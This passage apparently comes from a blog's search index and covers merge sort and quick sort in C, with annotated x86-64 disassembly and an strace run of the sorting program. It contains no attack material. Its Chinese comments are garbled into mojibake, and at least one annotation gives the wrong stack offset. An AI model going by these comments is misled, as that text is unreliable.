000000000000093d \u003cmain\u003e: 93d:\t55 push %rbp 93e:\t48 89 e5 mov %rsp,%rbp 941:\t48 83 ec 40 sub $0x40,%rsp 945:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 94c:\t00 00 94e:\t48 89 45 f8 mov %rax,-0x8(%rbp) 952:\t31 c0 xor %eax,%eax 954:\tc7 45 d0 09 00 00 00 movl $0x9,-0x30(%rbp) ; 0x9 å¤åˆ¶åˆ° rbp - 0x30 åœ°å€å¤„ã€‚array[0] = 0x9 95b:\tc7 45 d4 03 00 00 00 movl $0x3,-0x2c(%rbp) ; 0x3 å¤åˆ¶åˆ° rbp - 0x2c åœ°å€å¤„ã€‚array[1] = 0x3 962:\tc7 45 d8 07 00 00 00 movl $0x7,-0x28(%rbp) ; 0x7 å¤åˆ¶åˆ° rbp - 0x28 åœ°å€å¤„ã€‚array[2] = 0x7 969:\tc7 45 dc 05 00 00 00 movl $0x5,-0x24(%rbp) ; 0x5 å¤åˆ¶åˆ° rbp - 0x24 åœ°å€å¤„ã€‚array[3] = 0x5 970:\tc7 45 e0 08 00 00 00 movl $0x8,-0x20(%rbp) ; 0x8 å¤åˆ¶åˆ° rbp - 0x20 åœ°å€å¤„ã€‚array[4] = 0x8 977:\tc7 45 e4 06 00 00 00 movl $0x6,-0x1c(%rbp) ; 0x6 å¤åˆ¶åˆ° rbp - 0x1c åœ°å€å¤„ã€‚array[5] = 0x6 97e:\tc7 45 e8 04 00 00 00 movl $0x4,-0x18(%rbp) ; 0x4 å¤åˆ¶åˆ° rbp - 0x28 åœ°å€å¤„ã€‚array[6] = 0x4 985:\tc7 45 ec 0a 00 00 00 movl $0xa,-0x14(%rbp) ; 0xa å¤åˆ¶åˆ° rbp - 0x14 åœ°å€å¤„ã€‚array[7] = 0xa 98c:\t48 8d 45 d0 lea -0x30(%rbp),%rax ; rax = \u0026array[0] 990:\tba 07 00 00 00 mov $0x7,%edx ; ç¬¬ä¸‰ä¸ªå‚æ•° 7 995:\tbe 00 00 00 00 mov $0x0,%esi ; ç¬¬äºŒä¸ªå‚æ•° 0 99a:\t48 89 c7 mov %rax,%rdi ; ç¬¬ä¸€ä¸ªå‚æ•° \u0026array[0] 99d:\te8 2a ff ff ff callq 8cc \u003cmergeSort\u003e ; è°ƒç”¨ mergeSortï¼Œåœ°å€åç§»æ˜¯ 0x8cc 9a2:\tc7 45 cc 00 00 00 00 movl $0x0,-0x34(%rbp) 9a9:\teb 20 jmp 9cb \u003cmain+0x8e\u003e 9ab:\t8b 45 cc mov -0x34(%rbp),%eax 9ae:\t48 98 cltq 9b0:\t8b 44 85 d0 mov -0x30(%rbp,%rax,4),%eax 9b4:\t89 c6 mov %eax,%esi 9b6:\t48 8d 3d b7 00 00 00 lea 0xb7(%rip),%rdi # a74 \u003c_IO_stdin_used+0x4\u003e 9bd:\tb8 00 00 00 00 mov $0x0,%eax 9c2:\te8 b9 fb ff ff callq 580 \u003cprintf@plt\u003e 9c7:\t83 45 cc 01 addl $0x1,-0x34(%rbp) 9cb:\t83 7d cc 07 cmpl $0x7,-0x34(%rbp) 9cf:\t7e da jle 9ab \u003cmain+0x6e\u003e 9d1:\tb8 00 00 00 00 mov $0x0,%eax 9d6:\t48 8b 4d f8 mov -0x8(%rbp),%rcx 9da:\t64 48 33 0c 25 28 00 xor %fs:0x28,%rcx 9e1:\t00 00 9e3:\t74 05 je 9ea \u003cmain+0xad\u003e 9e5:\te8 86 fb ff ff callq 570 \u003c__stack_chk_fail@plt\u003e 9ea:\tc9 leaveq 9eb:\tc3 retq 9ec:\t0f 1f 40 00 nopl 0x0(%rax) 00000000000009f0 \u003c__libc_csu_init\u003e: 9f0:\t41 57 push %r15 9f2:\t41 56 push %r14 9f4:\t49 89 d7 mov %rdx,%r15 9f7:\t41 55 push %r13 9f9:\t41 54 push %r12 9fb:\t4c 8d 25 ae 03 20 00 lea 0x2003ae(%rip),%r12 # 200db0 \u003c__frame_dummy_init_array_entry\u003e a02:\t55 push %rbp a03:\t48 8d 2d ae 03 20 00 lea 0x2003ae(%rip),%rbp # 200db8 \u003c__init_array_end\u003e a0a:\t53 push %rbx a0b:\t41 89 fd mov %edi,%r13d a0e:\t49 89 f6 mov %rsi,%r14 a11:\t4c 29 e5 sub %r12,%rbp a14:\t48 83 ec 08 sub $0x8,%rsp a18:\t48 c1 fd 03 sar $0x3,%rbp a1c:\te8 27 fb ff ff callq 548 \u003c_init\u003e a21:\t48 85 ed test %rbp,%rbp a24:\t74 20 je a46 \u003c__libc_csu_init+0x56\u003e a26:\t31 db xor %ebx,%ebx a28:\t0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) a2f:\t00 a30:\t4c 89 fa mov %r15,%rdx a33:\t4c 89 f6 mov %r14,%rsi a36:\t44 89 ef mov %r13d,%edi a39:\t41 ff 14 dc callq *(%r12,%rbx,8) a3d:\t48 83 c3 01 add $0x1,%rbx a41:\t48 39 dd cmp %rbx,%rbp a44:\t75 ea jne a30 \u003c__libc_csu_init+0x40\u003e a46:\t48 83 c4 08 add $0x8,%rsp a4a:\t5b pop %rbx a4b:\t5d pop %rbp a4c:\t41 5c pop %r12 a4e:\t41 5d pop %r13 a50:\t41 5e pop %r14 a52:\t41 5f pop %r15 a54:\tc3 retq a55:\t90 nop a56:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) a5d:\t00 00 00 0000000000000a60 \u003c__libc_csu_fini\u003e: a60:\tf3 c3 repz retq Disassembly of section .fini: 0000000000000a64 \u003c_fini\u003e: a64:\t48 83 ec 08 sub $0x8,%rsp a68:\t48 83 c4 08 add $0x8,%rsp a6c:\tc3 retq æ ˆå¸§è°ƒç”¨å›¾è§£åˆ†æ æ ˆå¸§å›¾åˆ†æ mergeSort_L å¯¹åº”çš„æ˜¯å·¦åŠä¾§çš„ mergeã€‚mid ä¸ºçº¢è‰² mergeSort_R å¯¹åº”çš„æ˜¯å³åŠä¾§çš„ mergeã€‚mid ä¸ºè“è‰² merge å¯¹åº”çš„æ˜¯æœ€ä¸‹å±‚çš„æµ…ç»¿è‰²ï¼Œç»¿è‰²ï¼Œæ·±ç»¿è‰²\narray å½’å¹¶é¡ºåºå›¾è§£åˆ†æ å¯ä»¥çœ‹åˆ°å¯¹äº array æ¥è¯´ï¼Œç¡®å®æ˜¯ä¸€åŠä¸€åŠ merge çš„, è¿™å°±æ˜¯åˆ†æ²»ã€‚\nstrace åˆ†æ root@aliyun:~# strace ./mergesort execve(\"./mergesort\", [\"./mergesort\"], 0x7fff5d5bf0c0 /* 27 vars */) = 0\rbrk(NULL) = 0x5583b9756000\raccess(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory)\raccess(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory)\ropenat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3\rfstat(3, {st_mode=S_IFREG|0644, st_size=39490, ...}) = 0\rmmap(NULL, 39490, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f4ed0097000\rclose(3) = 0\raccess(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory)\ropenat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3\rread(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u003e\\0\\1\\0\\0\\0\\260\\34\\2\\0\\0\\0\\0\\0\"..., 832) = 832\rfstat(3, {st_mode=S_IFREG|0755, st_size=2030544, ...}) = 0\rmmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f4ed0095000\rmmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f4ecfa89000\rmprotect(0x7f4ecfc70000, 2097152, PROT_NONE) = 0\rmmap(0x7f4ecfe70000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f4ecfe70000\rmmap(0x7f4ecfe76000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f4ecfe76000\rclose(3) = 0\rarch_prctl(ARCH_SET_FS, 0x7f4ed00964c0) = 0\rmprotect(0x7f4ecfe70000, 16384, PROT_READ) = 0\rmprotect(0x5583b9675000, 4096, PROT_READ) = 0\rmprotect(0x7f4ed00a1000, 4096, PROT_READ) = 0\rmunmap(0x7f4ed0097000, 39490) = 0\rfstat(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0\rbrk(NULL) = 0x5583b9756000\rbrk(0x5583b9777000) = 0x5583b9777000\rwrite(1, \"3 4 5 6 7 8 9 10 \", 173 4 5 6 7 8 9 10 ) = 17\rexit_group(0) = ?\r+++ exited with 0 +++ reference why-does-this-memory-address-fs0x28-fs0x28-have-a-random-value stack-smashing jge cmp assembly-guide Shift Arithmetic Right x86-asm-leave x86-instructions-guide Notes on x86-64 programming x86-multiply x64_cheatsheet CS107 Spring 2019 CS107, Lecture 12 Assembly: Arithmetic, Logic and Condition Codes x86-flags xor x64-into å½’å¹¶æ’åº "},"title":"algorithm-merge-sort"},"/blog/algorithm-quick-sort/":{"data":{"":"","quick-sort#quick sort":"quick sort C ä»£ç  #include \u003cstdio.h\u003e int partition(int* array, int startIndex, int endIndex){ int left = startIndex; int right = endIndex; int pivot = array[startIndex]; int temp = 0; // ç¬¬ä¸€ä¸ª while å¾ªç¯ï¼Œå…¶å®å°±æ˜¯ä»ä¸¤ä¸ªæ–¹å‘éå†ä¸€æ¬¡æ•°ç»„ï¼Œæ ¹æ® pivot è¿›è¡Œåˆ†å‰²ã€‚ while (left != right) { // ç¬¬äºŒä¸ª while å¾ªç¯ï¼Œ æ‰¾ä¸€ä¸ª array[right] \u003c= pivotï¼Œä¹Ÿå°±æ˜¯æ‰¾ä¸€ä¸ªå°äºç­‰äº pivot çš„å…ƒç´  while (left \u003c right \u0026\u0026 array[right] \u003e pivot) { right--; } // ç¬¬ä¸‰ä¸ª while å¾ªç¯ï¼Œ æ‰¾ä¸€ä¸ª array[left] \u003e pivotï¼Œä¹Ÿå°±æ˜¯æ‰¾ä¸€ä¸ªå¤§äºç­‰äº pivot çš„å…ƒç´ ã€‚ while (left \u003c right \u0026\u0026 array[left] \u003c= pivot) { left++; } // äº¤æ¢æ‰¾åˆ°çš„ä¸¤ä¸ªå…ƒç´  if(left \u003c right) { temp = array[left]; array[left] = array[right]; array[right] = temp; } } // pivot å½’ä½, å·¦è¾¹éƒ½æ¯” pivot å°ï¼Œ å³è¾¹éƒ½æ¯” pivot å¤§ temp = array[left]; array[left] = pivot; array[startIndex] = temp; return left; } void quickSort(int* array, int startIndex, int endIndex){ // åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œæœ‰åºã€‚ç›´æ¥è¿”å› if(startIndex \u003e= endIndex){ return; } // ä¸€æ¬¡ partition æœ‰åºä¸€ä¸ªå…ƒç´ ã€‚è¢« pivot åˆ†å‰²çš„ä¸¤éƒ¨åˆ†ç»§ç»­ quick sort int pivotIndex = partition(array, startIndex, endIndex); quickSort(array, startIndex, pivotIndex - 1); quickSort(array, pivotIndex + 1, endIndex); } int main(){ int array[8] = {4,7,6,5,3,2,8,1}; quickSort(array, 0, 7); for (int i = 0; i \u003c 8; i++) { printf(\"%d \",array[i]); } return 0; } æ±‡ç¼–ä»£ç åˆ†æ quickSort: file format elf64-x86-64 Disassembly of section .init: 0000000000000548 \u003c_init\u003e: 548:\t48 83 ec 08 sub $0x8,%rsp 54c:\t48 8b 05 95 0a 20 00 mov 0x200a95(%rip),%rax # 200fe8 \u003c__gmon_start__\u003e 553:\t48 85 c0 test %rax,%rax 556:\t74 02 je 55a \u003c_init+0x12\u003e 558:\tff d0 callq *%rax 55a:\t48 83 c4 08 add $0x8,%rsp 55e:\tc3 retq Disassembly of section .plt: 0000000000000560 \u003c.plt\u003e: 560:\tff 35 52 0a 20 00 pushq 0x200a52(%rip) # 200fb8 \u003c_GLOBAL_OFFSET_TABLE_+0x8\u003e 566:\tff 25 54 0a 20 00 jmpq *0x200a54(%rip) # 200fc0 \u003c_GLOBAL_OFFSET_TABLE_+0x10\u003e 56c:\t0f 1f 40 00 nopl 0x0(%rax) 0000000000000570 \u003c__stack_chk_fail@plt\u003e: 570:\tff 25 52 0a 20 00 jmpq *0x200a52(%rip) # 200fc8 \u003c__stack_chk_fail@GLIBC_2.4\u003e 576:\t68 00 00 00 00 pushq $0x0 57b:\te9 e0 ff ff ff jmpq 560 \u003c.plt\u003e 0000000000000580 \u003cprintf@plt\u003e: 580:\tff 25 4a 0a 20 00 jmpq *0x200a4a(%rip) # 200fd0 \u003cprintf@GLIBC_2.2.5\u003e 586:\t68 01 00 00 00 pushq $0x1 58b:\te9 d0 ff ff ff jmpq 560 \u003c.plt\u003e Disassembly of section .plt.got: 0000000000000590 \u003c__cxa_finalize@plt\u003e: 590:\tff 25 62 0a 20 00 jmpq *0x200a62(%rip) # 200ff8 \u003c__cxa_finalize@GLIBC_2.2.5\u003e 596:\t66 90 xchg %ax,%ax Disassembly of section .text: 00000000000005a0 \u003c_start\u003e: 5a0:\t31 ed xor %ebp,%ebp ; ebp = 0 5a2:\t49 89 d1 mov %rdx,%r9 ; r9 = rdx 5a5:\t5e pop %rsi 5a6:\t48 89 e2 mov %rsp,%rdx ; rdx = rsp 5a9:\t48 83 e4 f0 and $0xfffffffffffffff0,%rsp 5ad:\t50 push %rax 5ae:\t54 push %rsp 5af:\t4c 8d 05 ca 03 00 00 lea 0x3ca(%rip),%r8 # 980 \u003c__libc_csu_fini\u003e 5b6:\t48 8d 0d 53 03 00 00 lea 0x353(%rip),%rcx # 910 \u003c__libc_csu_init\u003e 5bd:\t48 8d 3d 9c 02 00 00 lea 0x29c(%rip),%rdi # 860 \u003cmain\u003e 5c4:\tff 15 16 0a 20 00 callq *0x200a16(%rip) # 200fe0 \u003c__libc_start_main@GLIBC_2.2.5\u003e 5ca:\tf4 hlt 5cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 00000000000005d0 \u003cderegister_tm_clones\u003e: 5d0:\t48 8d 3d 39 0a 20 00 lea 0x200a39(%rip),%rdi # 201010 \u003c__TMC_END__\u003e 5d7:\t55 push %rbp 5d8:\t48 8d 05 31 0a 20 00 lea 0x200a31(%rip),%rax # 201010 \u003c__TMC_END__\u003e 5df:\t48 39 f8 cmp %rdi,%rax 5e2:\t48 89 e5 mov %rsp,%rbp 5e5:\t74 19 je 600 \u003cderegister_tm_clones+0x30\u003e 5e7:\t48 8b 05 ea 09 20 00 mov 0x2009ea(%rip),%rax # 200fd8 \u003c_ITM_deregisterTMCloneTable\u003e 5ee:\t48 85 c0 test %rax,%rax 5f1:\t74 0d je 600 \u003cderegister_tm_clones+0x30\u003e 5f3:\t5d pop %rbp 5f4:\tff e0 jmpq *%rax 5f6:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 5fd:\t00 00 00 600:\t5d pop %rbp 601:\tc3 retq 602:\t0f 1f 40 00 nopl 0x0(%rax) 606:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 60d:\t00 00 00 0000000000000610 \u003cregister_tm_clones\u003e: 610:\t48 8d 3d f9 09 20 00 lea 0x2009f9(%rip),%rdi # 201010 \u003c__TMC_END__\u003e 617:\t48 8d 35 f2 09 20 00 lea 0x2009f2(%rip),%rsi # 201010 \u003c__TMC_END__\u003e 61e:\t55 push %rbp 61f:\t48 29 fe sub %rdi,%rsi 622:\t48 89 e5 mov %rsp,%rbp 625:\t48 c1 fe 03 sar $0x3,%rsi 629:\t48 89 f0 mov %rsi,%rax 62c:\t48 c1 e8 3f shr $0x3f,%rax 630:\t48 01 c6 add %rax,%rsi 633:\t48 d1 fe sar %rsi 636:\t74 18 je 650 \u003cregister_tm_clones+0x40\u003e 638:\t48 8b 05 b1 09 20 00 mov 0x2009b1(%rip),%rax # 200ff0 \u003c_ITM_registerTMCloneTable\u003e 63f:\t48 85 c0 test %rax,%rax 642:\t74 0c je 650 \u003cregister_tm_clones+0x40\u003e 644:\t5d pop %rbp 645:\tff e0 jmpq *%rax 647:\t66 0f 1f 84 00 00 00 nopw 0x0(%rax,%rax,1) 64e:\t00 00 650:\t5d pop %rbp 651:\tc3 retq 652:\t0f 1f 40 00 nopl 0x0(%rax) 656:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 65d:\t00 00 00 0000000000000660 \u003c__do_global_dtors_aux\u003e: 660:\t80 3d a9 09 20 00 00 cmpb $0x0,0x2009a9(%rip) # 201010 \u003c__TMC_END__\u003e 667:\t75 2f jne 698 \u003c__do_global_dtors_aux+0x38\u003e 669:\t48 83 3d 87 09 20 00 cmpq $0x0,0x200987(%rip) # 200ff8 \u003c__cxa_finalize@GLIBC_2.2.5\u003e 670:\t00 671:\t55 push %rbp 672:\t48 89 e5 mov %rsp,%rbp 675:\t74 0c je 683 \u003c__do_global_dtors_aux+0x23\u003e 677:\t48 8b 3d 8a 09 20 00 mov 0x20098a(%rip),%rdi # 201008 \u003c__dso_handle\u003e 67e:\te8 0d ff ff ff callq 590 \u003c__cxa_finalize@plt\u003e 683:\te8 48 ff ff ff callq 5d0 \u003cderegister_tm_clones\u003e 688:\tc6 05 81 09 20 00 01 movb $0x1,0x200981(%rip) # 201010 \u003c__TMC_END__\u003e 68f:\t5d pop %rbp 690:\tc3 retq 691:\t0f 1f 80 00 00 00 00 nopl 0x0(%rax) 698:\tf3 c3 repz retq 69a:\t66 0f 1f 44 00 00 nopw 0x0(%rax,%rax,1) 00000000000006a0 \u003cframe_dummy\u003e: 6a0:\t55 push %rbp 6a1:\t48 89 e5 mov %rsp,%rbp 6a4:\t5d pop %rbp 6a5:\te9 66 ff ff ff jmpq 610 \u003cregister_tm_clones\u003e 00000000000006aa \u003cpartition\u003e: 6aa:\t55 push %rbp 6ab:\t48 89 e5 mov %rsp,%rbp 6ae:\t48 89 7d e8 mov %rdi,-0x18(%rbp) ; \u0026array[0] 6b2:\t89 75 e4 mov %esi,-0x1c(%rbp) ; startIndex 6b5:\t89 55 e0 mov %edx,-0x20(%rbp) ; endIndex 6b8:\t8b 45 e4 mov -0x1c(%rbp),%eax ; eax = startIndex 6bb:\t89 45 f0 mov %eax,-0x10(%rbp) ; left = startIndex 6be:\t8b 45 e0 mov -0x20(%rbp),%eax ; eax = endIndex 6c1:\t89 45 f4 mov %eax,-0xc(%rbp) ; right = endIndex 6c4:\t8b 45 e4 mov -0x1c(%rbp),%eax ; eax = startIndex 6c7:\t48 98 cltq 6c9:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * startIndex 6d0:\t00 6d1:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 6d5:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * startIndex 6d8:\t8b 00 mov (%rax),%eax ; eax = array[startIndex] 6da:\t89 45 f8 mov %eax,-0x8(%rbp) ; pivot = array[startIndex] 6dd:\tc7 45 fc 00 00 00 00 movl $0x0,-0x4(%rbp) ; temp = 0; 6e4:\te9 b7 00 00 00 jmpq 7a0 \u003cpartition+0xf6\u003e ; è·³è½¬åˆ° while(left != right) åˆ¤æ–­ left != right ; ç¬¬äºŒä¸ª while å¾ªç¯çš„å¾ªç¯ä½“ 6e9:\t83 6d f4 01 subl $0x1,-0xc(%rbp) ; right = right - 1 ; while(left != right) çš„å¾ªç¯ä½“ 6ed:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 6f0:\t3b 45 f4 cmp -0xc(%rbp),%eax ; cmp right,left 6f3:\t7d 21 jge 716 \u003cpartition+0x6c\u003e ; left \u003e= rightï¼Œç¬¬äºŒä¸ª while å¾ªç¯ä¸æ»¡è¶³ï¼Œè¿›å…¥åˆ¤æ–­ç¬¬ä¸‰ä¸ª while å¾ªç¯ 6f5:\t8b 45 f4 mov -0xc(%rbp),%eax ; eax = right èƒ½æ‰§è¡Œåˆ°è¿™ï¼Œè¯´æ˜ left \u003c right 6f8:\t48 98 cltq ; convert eax to rax 6fa:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx; rdx = 4 * right 701:\t00 702:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 706:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * right 709:\t8b 00 mov (%rax),%eax ; eax = array[right] 70b:\t39 45 f8 cmp %eax,-0x8(%rbp) ; cmp array[right],pivot 70e:\t7c d9 jl 6e9 \u003cpartition+0x3f\u003e ; pivot \u003c array[right] æ‰§è¡Œè·³è½¬ï¼Œæ‰§è¡Œå¾ªç¯ä½“ã€‚ 710:\teb 04 jmp 716 \u003cpartition+0x6c\u003e ; ; ç¬¬ä¸‰ä¸ª while å¾ªç¯çš„å¾ªç¯ä½“ 712:\t83 45 f0 01 addl $0x1,-0x10(%rbp) ; left = left + 1 ; ç¬¬ä¸‰ä¸ª while å¾ªç¯ 716:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 719:\t3b 45 f4 cmp -0xc(%rbp),%eax ; cmp,right,left 71c:\t7d 1b jge 739 \u003cpartition+0x8f\u003e ; left \u003e= rightï¼Œç¬¬ä¸‰ä¸ª while å¾ªç¯ æ¡ä»¶ 1 ä¸æ»¡è¶³ï¼ŒçŸ­è·¯ã€‚è¿›å…¥ if è¯­å¥ã€‚ 71e:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 721:\t48 98 cltq 723:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * left 72a:\t00 72b:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 72f:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * left 732:\t8b 00 mov (%rax),%eax ; eax = array[left] 734:\t39 45 f8 cmp %eax,-0x8(%rbp) ; cmp,array[left],pivot 737:\t7d d9 jge 712 \u003cpartition+0x68\u003e ; pivot \u003e= array[left]ï¼Œç¬¬ä¸‰ä¸ª while å¾ªç¯ æ¡ä»¶ 2 æ»¡è¶³ã€‚æ‰§è¡Œå¾ªç¯ä½“ã€‚ ; if ä»£ç å—å¼€å§‹ 739:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 73c:\t3b 45 f4 cmp -0xc(%rbp),%eax ; cmp right,left 73f:\t7d 5f jge 7a0 \u003cpartition+0xf6\u003e ; left \u003e= right è¿›å…¥ä¸‹ä¸€è½®å¾ªç¯ 741:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 744:\t48 98 cltq 746:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * left 74d:\t00 74e:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 752:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * left 755:\t8b 00 mov (%rax),%eax ; eax = array[left] 757:\t89 45 fc mov %eax,-0x4(%rbp) ; temp = array[left] 75a:\t8b 45 f4 mov -0xc(%rbp),%eax ; eax = right 75d:\t48 98 cltq 75f:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * right 766:\t00 767:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 76b:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * right 76e:\t8b 55 f0 mov -0x10(%rbp),%edx ; edx = left 771:\t48 63 d2 movslq %edx,%rdx ; 774:\t48 8d 0c 95 00 00 00 lea 0x0(,%rdx,4),%rcx ; rcx = 4 * left 77b:\t00 77c:\t48 8b 55 e8 mov -0x18(%rbp),%rdx ; rdx = \u0026array[0] 780:\t48 01 ca add %rcx,%rdx ; rdx = \u0026array[0] + 4 * left 783:\t8b 00 mov (%rax),%eax ; eax = array[right] 785:\t89 02 mov %eax,(%rdx) ; array[left] = array[right] 787:\t8b 45 f4 mov -0xc(%rbp),%eax ; eax = right 78a:\t48 98 cltq 78c:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * right 793:\t00 794:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 798:\t48 01 c2 add %rax,%rdx ; rdx = \u0026array[0] + 4 * right 79b:\t8b 45 fc mov -0x4(%rbp),%eax ; eax = temp; 79e:\t89 02 mov %eax,(%rdx) ; array[right] = temp ; if ä»£ç å—ç»“æŸ ; while(left != right) è¿›å…¥å¾ªç¯çš„æ¡ä»¶åˆ¤æ–­ 7a0:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 7a3:\t3b 45 f4 cmp -0xc(%rbp),%eax ; cpm right, left 7a6:\t0f 85 41 ff ff ff jne 6ed \u003cpartition+0x43\u003e ; left != right æ»¡è¶³å¾ªç¯æ¡ä»¶è¿›å…¥å¾ªç¯ä½“ 7ac:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left ä¸æ»¡è¶³å¾ªç¯æ¡ä»¶ left != rightï¼Œæ­¤æ—¶å¾ªç¯ç»“æŸã€‚ ; pivot å½’ä½ 7af:\t48 98 cltq 7b1:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * left 7b8:\t00 7b9:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 7bd:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * left 7c0:\t8b 00 mov (%rax),%eax ; eax = array[left] 7c2:\t89 45 fc mov %eax,-0x4(%rbp) ; temp = array[left] 7c5:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left 7c8:\t48 98 cltq 7ca:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * left 7d1:\t00 7d2:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 7d6:\t48 01 c2 add %rax,%rdx ; rdx = \u0026array[0] + 4 * left 7d9:\t8b 45 f8 mov -0x8(%rbp),%eax ; eax = pivot 7dc:\t89 02 mov %eax,(%rdx) ; array[left] = pivot 7de:\t8b 45 e4 mov -0x1c(%rbp),%eax ; eax = startIndex 7e1:\t48 98 cltq 7e3:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * startIndex 7ea:\t00 7eb:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 7ef:\t48 01 c2 add %rax,%rdx ; rdx = \u0026array[0] + 4 * startIndex 7f2:\t8b 45 fc mov -0x4(%rbp),%eax ; eax = temp 7f5:\t89 02 mov %eax,(%rdx) ; array[startIndex] = temp 7f7:\t8b 45 f0 mov -0x10(%rbp),%eax ; eax = left è¿”å›å€¼ 7fa:\t5d pop %rbp ; pop è°ƒç”¨è€…çš„ rbp 7fb:\tc3 retq ; 1. pop %rip 2.jmp %rip 00000000000007fc \u003cquickSort\u003e: 7fc:\t55 push %rbp 7fd:\t48 89 e5 mov %rsp,%rbp 800:\t48 83 ec 20 sub $0x20,%rsp ;åˆ†é… 32Bytes ç©ºé—´ 804:\t48 89 7d e8 mov %rdi,-0x18(%rbp) ; \u0026array[0] 808:\t89 75 e4 mov %esi,-0x1c(%rbp) ; startIndex 80b:\t89 55 e0 mov %edx,-0x20(%rbp) ; endIndex 80e:\t8b 45 e4 mov -0x1c(%rbp),%eax ; eax = startIndex 811:\t3b 45 e0 cmp -0x20(%rbp),%eax ; cmp endIndex,startIndex 814:\t7d 47 jge 85d \u003cquickSort+0x61\u003e ; startIndex \u003e= endIndex ä¸æ»¡è¶³æ¡ä»¶ï¼Œé”€æ¯æ ˆå¸§ï¼Œç»“æŸè°ƒç”¨ã€‚ 816:\t8b 55 e0 mov -0x20(%rbp),%edx ; edx = endIndex ç¬¬ä¸‰ä¸ªå‚æ•° èƒ½æ‰§è¡Œåˆ°è¿™ï¼Œè¯´æ˜ startIndex \u003c endIndex 819:\t8b 4d e4 mov -0x1c(%rbp),%ecx ; ecx = startIndex 81c:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 820:\t89 ce mov %ecx,%esi ; esi = startIndex ç¬¬äºŒä¸ªå‚æ•° 822:\t48 89 c7 mov %rax,%rdi ; rdi = \u0026array[0] ç¬¬ä¸€ä¸ªå‚æ•° 825:\te8 80 fe ff ff callq 6aa \u003cpartition\u003e 82a:\t89 45 fc mov %eax,-0x4(%rbp) ; pivotIndex = eax partition çš„è¿”å›å€¼åœ¨ eax é‡Œ 82d:\t8b 45 fc mov -0x4(%rbp),%eax ; eax = pivotIndex 830:\t8d 50 ff lea -0x1(%rax),%edx ; edx = pivotIndex - 1 ç¬¬ä¸‰ä¸ªå‚æ•° 833:\t8b 4d e4 mov -0x1c(%rbp),%ecx ; ecx = startIndex 836:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 83a:\t89 ce mov %ecx,%esi ; esi = startIndex ç¬¬äºŒä¸ªå‚æ•° 83c:\t48 89 c7 mov %rax,%rdi ; rdi = \u0026array[0] ç¬¬ä¸€ä¸ªå‚æ•° 83f:\te8 b8 ff ff ff callq 7fc \u003cquickSort\u003e ; quickSort(array, startIndex, pivotIndex - 1) 844:\t8b 45 fc mov -0x4(%rbp),%eax ; eax = pivotIndex 847:\t8d 48 01 lea 0x1(%rax),%ecx ; ecx = pivotIndex + 1 84a:\t8b 55 